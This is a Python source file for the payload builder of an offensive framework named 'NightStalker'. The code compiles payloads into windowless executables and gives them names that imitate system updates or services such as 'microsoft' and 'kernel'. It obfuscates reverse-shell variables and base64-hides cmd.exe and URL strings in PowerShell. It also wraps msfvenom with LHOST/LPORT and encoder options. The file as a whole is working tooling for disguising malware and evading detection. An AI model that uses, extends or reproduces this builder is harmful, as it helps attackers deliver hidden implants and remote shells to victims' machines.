#!/usr/bin/env python3
"""
NightStalker Payload Builder
Handles payload generation and building for various platforms
"""

import os
import sys
import subprocess
import tempfile
import shutil
import time
import random
import string
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import json
import base64
import hashlib

from ..utils.logger import Logger
from ..utils.config import Config

class PayloadBuilder:
    """Handles payload generation and building for various platforms"""
    
    def __init__(self):
        self.logger = Logger(__name__)
        self.config = Config()
        
        # Supported platforms
        self.platforms = {
            'windows': {
                'extensions': ['.exe', '.dll', '.bat', '.ps1'],
                'compilers': ['pyinstaller', 'cx_freeze', 'auto-py-to-exe']
            },
            'linux': {
                'extensions': ['.elf', '.sh', '.py'],
                'compilers': ['pyinstaller', 'cx_freeze']
            },
            'macos': {
                'extensions': ['.app', '.dmg', '.sh', '.py'],
                'compilers': ['pyinstaller', 'cx_freeze']
            }
        }
        
        # Default settings
        self.output_dir = "output/payloads"
        self.temp_dir = "temp"
        
    def create_output_dirs(self) -> None:
        """Create necessary output directories"""
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        Path(self.temp_dir).mkdir(parents=True, exist_ok=True)
    
    def generate_payload_name(self, platform: str, payload_type: str) -> str:
        """Generate a random payload name"""
        prefixes = {
            'windows': ['update', 'service', 'system', 'windows', 'microsoft'],
            'linux': ['update', 'service', 'system', 'linux', 'kernel'],
            'macos': ['update', 'service', 'system', 'macos', 'apple']
        }
        
        prefix = random.choice(prefixes.get(platform, ['update']))
        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        
        return f"{prefix}_{suffix}"
    
    def build_python_payload(self, source_file: str, platform: str, options: Dict) -> Optional[str]:
        """Build Python payload using PyInstaller"""
        try:
            self.create_output_dirs()
            
            payload_name = options.get('name', self.generate_payload_name(platform, 'python'))
            output_file = f"{self.output_dir}/{payload_name}"
            
            # PyInstaller command
            cmd = [
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--name', payload_name,
                '--distpath', self.output_dir,
                '--workpath', self.temp_dir,
                '--specpath', self.temp_dir,
                source_file
            ]
            
            # Platform-specific options
            if platform == 'windows':
                cmd.extend(['--target-architecture', 'x86_64'])
            elif platform == 'linux':
                cmd.extend(['--target-architecture', 'x86_64'])
            elif platform == 'macos':
                cmd.extend(['--target-architecture', 'x86_64'])
            
            # Additional options
            if options.get('icon'):
                cmd.extend(['--icon', options['icon']])
            
            if options.get('hidden'):
                cmd.extend(['--hidden-import', 'win32api', '--hidden-import', 'win32con'])
            
            self.logger.info(f"Building payload with PyInstaller: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            
            if result.returncode == 0:
                self.logger.info(f"Payload built successfully: {output_file}")
                return output_file
            else:
                self.logger.error(f"PyInstaller failed: {result.stderr}")
                return None
                
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Build process failed: {e}")
            return None
        except Exception as e:
            self.logger.error(f"Unexpected error during build: {e}")
            return None
    
    def build_shell_payload(self, source_file: str, platform: str, options: Dict) -> Optional[str]:
        """Build shell script payload"""
        try:
            self.create_output_dirs()
            
            payload_name = options.get('name', self.generate_payload_name(platform, 'shell'))
            output_file = f"{self.output_dir}/{payload_name}.sh"
            
            # Copy and modify shell script
            with open(source_file, 'r') as f:
                content = f.read()
            
            # Apply any modifications
            if options.get('obfuscate'):
                content = self.obfuscate_shell_script(content)
            
            # Write output file
            with open(output_file, 'w') as f:
                f.write(content)
            
            # Make executable on Unix systems
            if platform in ['linux', 'macos']:
                os.chmod(output_file, 0o755)
            
            self.logger.info(f"Shell payload created: {output_file}")
            return output_file
            
        except Exception as e:
            self.logger.error(f"Failed to build shell payload: {e}")
            return None
    
    def obfuscate_shell_script(self, content: str) -> str:
        """Basic shell script obfuscation"""
        # Simple variable name obfuscation
        variables = ['HOST', 'PORT', 'SHELL', 'CONNECTION']
        for var in variables:
            if var in content:
                new_var = ''.join(random.choices(string.ascii_uppercase, k=8))
                content = content.replace(var, new_var)
        
        return content
    
    def build_powershell_payload(self, source_file: str, options: Dict) -> Optional[str]:
        """Build PowerShell payload"""
        try:
            self.create_output_dirs()
            
            payload_name = options.get('name', self.generate_payload_name('windows', 'powershell'))
            output_file = f"{self.output_dir}/{payload_name}.ps1"
            
            # Read source file
            with open(source_file, 'r') as f:
                content = f.read()
            
            # Apply obfuscation if requested
            if options.get('obfuscate'):
                content = self.obfuscate_powershell_script(content)
            
            # Write output file
            with open(output_file, 'w') as f:
                f.write(content)
            
            self.logger.info(f"PowerShell payload created: {output_file}")
            return output_file
            
        except Exception as e:
            self.logger.error(f"Failed to build PowerShell payload: {e}")
            return None
    
    def obfuscate_powershell_script(self, content: str) -> str:
        """Basic PowerShell obfuscation"""
        # Simple string obfuscation
        strings = ['http://', 'https://', 'cmd.exe', 'powershell.exe']
        for s in strings:
            if s in content:
                # Convert to base64 and decode
                encoded = base64.b64encode(s.encode()).decode()
                replacement = f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded}'))"
                content = content.replace(s, replacement)
        
        return content
    
    def build_msfvenom_payload(self, payload_type: str, lhost: str, lport: int, options: Dict) -> Optional[str]:
        """Build payload using msfvenom"""
        try:
            self.create_output_dirs()
            
            payload_name = options.get('name', self.generate_payload_name('windows', 'msfvenom'))
            output_file = f"{self.output_dir}/{payload_name}"
            
            # Build msfvenom command
            cmd = [
                'msfvenom',
                '-p', payload_type,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', options.get('format', 'exe'),
                '-o', output_file
            ]
            
            # Additional options
            if options.get('encoder'):
                cmd.extend(['-e', options['encoder']])
            
            if options.get('iterations'):
                cmd.extend(['-i', str(options['iterations'])])
            
            self.logger.info(f"Building msfvenom payload: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            
            if result.returncode == 0:
                self.logger.info(f"msfvenom payload created: {output_file}")
                return output_file
            else:
                self.logger.error(f"msfvenom failed: {result.stderr}")
                return None
                
        except subprocess.CalledProcessError as e:
            self.logger.error(f"msfvenom process failed: {e}")
            return None
        except Exception as e:
            self.logger.error(f"Unexpected error during msfvenom build: {e}")
            return None
    
    def cleanup_temp_files(self) -> None:
        """Clean up temporary files"""
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
            self.logger.info("Temporary files cleaned up")
        except Exception as e:
            self.logger.error(f"Failed to cleanup temp files: {e}")
    
    def list_built_payloads(self) -> List[str]:
        """List all built payloads"""
        try:
            if not os.path.exists(self.output_dir):
                return []
            
            payloads = []
            for file in os.listdir(self.output_dir):
                file_path = os.path.join(self.output_dir, file)
                if os.path.isfile(file_path):
                    payloads.append(file_path)
            
            return payloads
        except Exception as e:
            self.logger.error(f"Failed to list payloads: {e}")
            return []
    
    def get_payload_info(self, payload_path: str) -> Dict:
        """Get information about a payload"""
        try:
            info = {
                'path': payload_path,
                'size': os.path.getsize(payload_path),
                'modified': time.ctime(os.path.getmtime(payload_path)),
                'type': Path(payload_path).suffix
            }
            
            # Calculate hash
            with open(payload_path, 'rb') as f:
                content = f.read()
                info['md5'] = hashlib.md5(content).hexdigest()
                info['sha256'] = hashlib.sha256(content).hexdigest()
            
            return info
        except Exception as e:
            self.logger.error(f"Failed to get payload info: {e}")
            return {} 